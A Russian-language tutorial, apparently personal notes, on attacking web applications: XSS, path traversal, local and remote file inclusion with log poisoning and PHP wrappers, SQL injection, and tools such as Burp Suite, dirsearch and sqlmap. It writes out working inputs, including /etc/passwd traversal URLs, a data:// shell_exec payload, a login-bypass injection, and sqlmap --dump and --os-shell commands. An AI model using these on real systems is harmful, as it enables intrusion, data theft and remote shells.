Веб-приложения составляют огромную часть того, что мы называем интернетом и зачастую они обрабатывают большое количество приватной информации и денег. Эта статья призвана научить основным атакам на веп приложения и научить взламывать их.
# Уязвимости
_____
## XSS
### Описание
Уязвимость появляется, когда пользовательский ввод попадает на страницу и может интерпритироваться как JavaScript код. Например, когда пользователь может указать в качестве имени при регистрации что-то типо <script>alert("Aboba")</script> и при загрузке его имени у других пользвателей будет выскакивать предупреждение с текстом Aboba. Это безобидный пример, но данная уязвимость позволяет выполнить любые действия на сайте от имени этого пользователя. Самая частая атака - кража Cookie. Cookie хранят информацию о сессии на сайте и их кража может позволить использовать сайт от имени человека, у которого был украден Cookie. Ввод пользователя всегда должен фильтроваться или кодировать, чтобы таких казусов не случалось.
______
## Path Traversal
______
### Описание
Уязвимость появляется, когда атакующий имеет возможность обращаться к файлам вне директории сайта. Уязвимость возможна из-за неправильной валидации пользовательского ввода и некорректного разграничения прав на стороне сервера.

Например, файлы сайта `https://coolsite89.ru/` расположены на сервере по пути `/var/www/html`. 
Если атакующий может обратиться по адресу `https://coolsite89.ru/../../../etc/passwd` и получить доступ к файлу, расположенному по пути `/etc/passwd`, то это Path Traversal. 
Атакующий как бы "Поднялся" по файловой структуре и после этого "Cпустился" к нужному ему файлу. Это происходит потому что две точки `..` в пути является ссылкой на родительскую папку. Таким образом путь `/Personal/Homework/Math/../..` будет вести туда же, куда и путь `/Personal/`.
______
### Поиск 
Path Traversal часто попадается там, где используются пути в GET параметрах. Например, путь `https://path.traversal73.com/news.php?article=howtofind.html` выглядит довольно подозрительно, так как в GET пареметре есть прямая ссылка на файл, причём с расширением `.html`. 

Мы можем попытаться обратиться к файлу `/etc/passwd`. Но мы не знаем насколько мы "Глубоко" в файловой системе. Для решения ётой проблемы мы будем добавлять в начало пути `../` до тех пор, пока не получится получить файл:
| Ссылка                                                                    | Код ответа |
| ------------------------------------------------------------------------- | ---------- |
| `https://path.traversal73.com/news.php?article=../etc/passwd`             | 404        |
| `https://path.traversal73.com/news.php?article=../../etc/passwd`          | 404        |
| `https://path.traversal73.com/news.php?article=../../../etc/passwd`       | 404        |
| `https://path.traversal73.com/news.php?article=../../../../etc/passwd`    | 404        |
| `https://path.traversal73.com/news.php?article=../../../../../etc/passwd` | 200        |

_____
## File Inclusion
______
### Описание
Уязвимость, похожая на Path Traversal, за одним исключением: здесь файлы, на которые ссылаются пути не просто читаются, а исполняются на сервере. 
File Inclusion делется на два основных типа:
- LFI(Local File Inclusion) файл расположен в файловой системе этого же сервера.
- RFI(Remote File Inclusion) файл расположен на внешнем ресурсе.
В обоих случаях идёт выполнение кода на сервере и мы можем поменять путь/ссылку на этот файл, чтобы вместо него выполнялся другой файл.
______
### Поиск
Методология поиска почти идентична методологии поиска Path Traversal. Также, стоит попытаться заменить путь в параметре внешную ссылку, указывающую на страницу с кодом(как правило PHP).
______
### Эксплойт
______
#### LFI
Для экплатациия нужно загрузить наш файл на сервер. Это возможн далеко не всегда, поэтому надо искать обходные пути.
##### Отравление логов
Большинство Веб-серверов записывают все URL, к которым мы обращались в лог файл. Это значит, что можно отправить запрос, содержащий наш PHP код на сервер, чтобы этот код попал в логи, а после этого обратится к логу через уязвимый параметр для выполнения кода, записанного в него. Пример отравленного лога:
![[Pasted image 20230331140504.png]]
Для отправки такого запроса был **в чистом виде** отправлен PHP код на сервер.
После загрузки кода, нам надо его выполнить. Представим, что уязвимость есть по адресу `https://path.traversal73.com/calculators.php?cur=euro.php`. Как правило логи лежат по пути `/var/log/apache2/access.log`
Попробуем обратиться. Мы можем попытаться обратиться по прямому пути: `https://path.traversal73.com/calculators.php?cur=/var/log/apache2/access.log`
Или же, если это не работает, можем попытаться использвать Path Traversal:
`https://path.traversal73.com/calculators.php?cur=../../../../../var/log/apache2/access.log`
После этого команда должна без проблем выполниться.
______
#### RFI
Тут логика похожая, но нам не надо записовать файл на сервер, который мы эксплутаруем. Вместо этого мы сами захостим файл и скормим серверу ссылку на него. Пусть исполняет!
Представим, что уязвим тот же путь:
`https://path.traversal73.com/calculators.php?cur=euro.php`
А давай захостим на каком-нибудь хостинге файл по адресу :
`https://mydomainorip.ru/rfi.txt`
Сам файл сожержит PHP код, который спокойно выводится в браузере при переходе по ссылке. А пусть теперь сервер его выполнит! Меняем путь до локального скрипта на сервере на нашу ссылку:
`https://path.traversal73.com/calculators.php?cur=https://mydomainorip.ru/rfi.txt`
После этого код должен выполниться.
______
### PHP Wrappers
Враперы позволяют фильтровать и модифицировать данные. Их можно использовать когда нет возможности загрузить файл на сервер, но есть LFI. Например:
```
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```
Тут используется врапер data для того, чтобы направить данные напрямую:
![[Pasted image 20230331151246.png]]
Так как был направлен PHP код, он выполнился на стороне сервера.
______
## SQL injection
______
### Описание
Уявимость происходит когда пользовательский ввод не фильтруется или экранируется при составлении запроса в базу данных. Эта уязвимость позволяет атакующему выполнять произвольные SQL запросы на сервере.
______
### Пример
______
#### Обычное использование
У нас в базе данных есть таблица users следующего вида:
| id  | login       | password       |
| --- | ----------- | -------------- |
| 1   | admin       | WNDe73@U325#@% |
| 2   | oleg_sex777 | aboba007       |
| 3    |     gnidaaa5        |     i3csgo           |
Когда пользователь вводит свой логин `oleg_sex777` и пароль `aboba007`  на сервере формируется примерно следующий SQL запрос:
```
SELECT login FROM users WHERE login = 'oleg_sex777' AND password = 'aboba007'
```
И пользователь входит в систему только, если логин существует и пароль совпадает с тем, что указан в базе данных для этого логина. 

Кстати, запрос выше можно перевести на русско-человеческий примерно так:
```
НАЙДИ login ИЗ ТАБЛИЦЫ users ГДЕ login = 'oleg_sex777' И password = 'aboba777'
```
______
#### Эксплуатация
А что, если разработчик поленился проверять ввод? Тогда мы сможем попытаться войти с логином `admin' OR '1' == '1'--` и случайным паролем. 
```
SELECT login FROM users WHERE login = 'admin' OR '1' == '1'--' AND password = 'daaefeafa`'
```
Теперь уже проверяется только существование пользвателя `admin` и `'1' == '1`'. Если в базе данных есть пользователь admin и один равен одному(спойлер, это всегда так), то мы входим в аккаунт. Пароль не проверяется так как мы написали `--` в конце запроса. Два минуса - это комментарий в SQL, он превращает в комментарий всё после него до конца запроса, а комментарии не исполняются. Иногда в качестве комментария используется символ`#`

Таким образом обе проверки проходят и мы попадаем в админку. 
______
### Поиск
Искать SQLi можно везде, где может быть база данных. Например, строки поиска, сообщения на форуме, формы входа и регистрации. Всё, что создаёт или как либо взамодействет с систематизированными данными может быть уязвимо.
Есть очень базовый способ проверить форму ввода на наличие очевидных SQLi уязвимостей. Нужно ввести в форму ввода одинарную кавычку и отправить данный на сервер. Если сервер обработает запрос некорректно и сайт выдаст ошибку базы данных, это значит, что форма скорее всего уязвима к SQLi. Также ошибки могут содержать много полезной информации. Такая ошибка может выглядеть следущим образом:
![[Pasted image 20230331155248.png]]

Сейчас сканеры автоматизированно ищут SQLi, причём довольно хорошо. Самая компактная утилита для поиска и эксплуатации таких уязвимостей - sqlmap.
_____
### sqlmap
sqlmap - это консольная утилита для поиска и эксплуатации SQLi уязвимостей.
Например, у нас есть статья по адресу `https://goodnews1337.ru/news.php?id=37` и мы хотим протестировать параметр id. Для этого мы можем ввести следующую команду:
```
$ sqlmap -u https://goodnews1337.ru/news.php?id=37 -p "id"
```
Часто используемые параметры параметры:
| Параметр   | Что делает                          |
| ---------- | ----------------------------------- |
| -u         | атакуемыйURL                        |
| -p         | атакуемый GET параметр              |
| --dbms     | указать тип БД                      |
| --dump     | Слить все данные из всех таблиц     |
| --os-shell | Получить доступ к коммандной строке |
Таким образом, еслы была найдена уязвимость, мы можем слить все данные следующей коммандой:
```
$ sqlmap -u https://goodnews1337.ru/news.php?id=37 -p "id" --dbms=mysql --dump
```
Более того, мы можем попытаться получить доступ к коммандной строке на уязвимом сервере с помощью команды:
```
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```
sqlmap умеет ещё много всего, но этому уже лучше будет научиться самостоятельно.
_____
# Инструменты
_____
## Burp Suite
______
### Выбор цели
Сначала необходимо выбрать цель, для этого необходимо перейти в модуль Target, на вкладку Scope. Тут можно добавлять и исключать адреса тестирования. 
![[Pasted image 20230331123619.png]]
Также в этом модуле, на вкладке Site map можно посмотреть все уязвимости, найденные на каждом отдельно взятом сайте и составить для них отчёт.
Для составления отчёта, нужно выбрать все уязвимости, нажать правую кнопку мыши и выбрать Report Selected items.
![[Pasted image 20230331123922.png]]
______
### Proxy
В разделе Proxy(1) можно управлять встроенным в Burp прокси-сервером.
Во вкладке Intercept(2) можно на ходу смотреть и изменять запросы, идущие к сайту.
Перехват запросов можно отключить кнопкой 3. Отправить текщий запрос можно кнопкой 4. Удалить запрос можно кнопкой 5. С помощью кнопки 6 можно перенаправить запрос в другие модули Burp для дальнейшей работы. Во вкладке HTTP history(7) можно посмотреть историю запросов.
![[Pasted image 20230331112714.png]]
______
### Intruder
В данный модуль можно отправить запрос из других модулей. Он позволяет автоматизировать тестирование. Мы можем выбрать кусок запроса и настроить словарь, который будет подставляться вместо этого куска запроса. Чаще всего это используется для подбора логинов и паролей.
Сначала выделяем нужные части запроса, в нашем случае это логин и пароль и нажимем Add &. После этого выбераем тип атаки.
![[Pasted image 20230331114056.png]]
Типов атаки всего четыре и лучше почитать их описание
![[Pasted image 20230331114250.png]]
После этого переходим на вкладку Payloads и настраиваем варианты текста для каждой позиции. Можно просто скопировать текст из словаря и нажать кнопку Paste. Когда всё настроено, нажимем Start attack и смотрим как атакется сайт.
![[Pasted image 20230331114455.png]]
После атаки среди запросов ижем нестандартные ответы и проверяем каждый такой ответ. Запрос ниже, например, это удачный вход в аккаунт админа.
![[Pasted image 20230331120046.png]]
______
### Repeater
Позволяет редактировать запрос и отправлять его на сервер. Очень удобная вешь для ручного тестирования запроса и тестирования логики сайта. 
Тут всё просто. Редактируем запрос, нажимаем Send и смотрим на ответ сервера.
![[Pasted image 20230331120243.png]]
______
### Scanner
Также Burp позволяет автоматизированно отсканить весь сайт. Для этого надо перейти на вкладку Dashboard и нажать New scan.
![[Pasted image 20230331123055.png]]
После этого надо будет указать ссылки сайтов, которые вы собираетесь сканировать:
![[Pasted image 20230331123207.png]]
А также выбрать глубину скана. Чем глубже скан, тем больше времени он будет идти.
![[Pasted image 20230331123307.png]]
После этого тыкаем Ok и ждём итогов скана!
______
## Dirsearch
dirsearch - это утилита для поиска скрытого контента на сайтах. Она перебирает все возможные пути по словарю и делает это в многопоточном режиме. Я советую использовать команду ниже.
```
$ dirsearch -u https://site.ru -w ~/wordlist.txt -o ~/dirsearch_output.txt
```
В команде используются следующие опции:
| Опция | Что делает    |
| ----- | ------------- |
| -u    | URL сайта     |
| -w    | словарь путей |
| -o      |  куда сохранить вывод             |

dirsearch может отрабатывать довольно долго, поэтому я рекомендую всегда вести запись в файл, чтобы не потерять результат сканирования. Внимание, эта утилитка отправляет довольно много запросов и может ненароком положить особо слабые сайты.
______
## Acunetix
Пожалуй, мой любимый сканер. 

Tools:
- Burp Suite(sncanner + intruder + repeater)
- Acunetix
- Netsparker
- dirb/dirsearch
	 - Nikto
	 - sqlmap
	- wappalyzer
	- 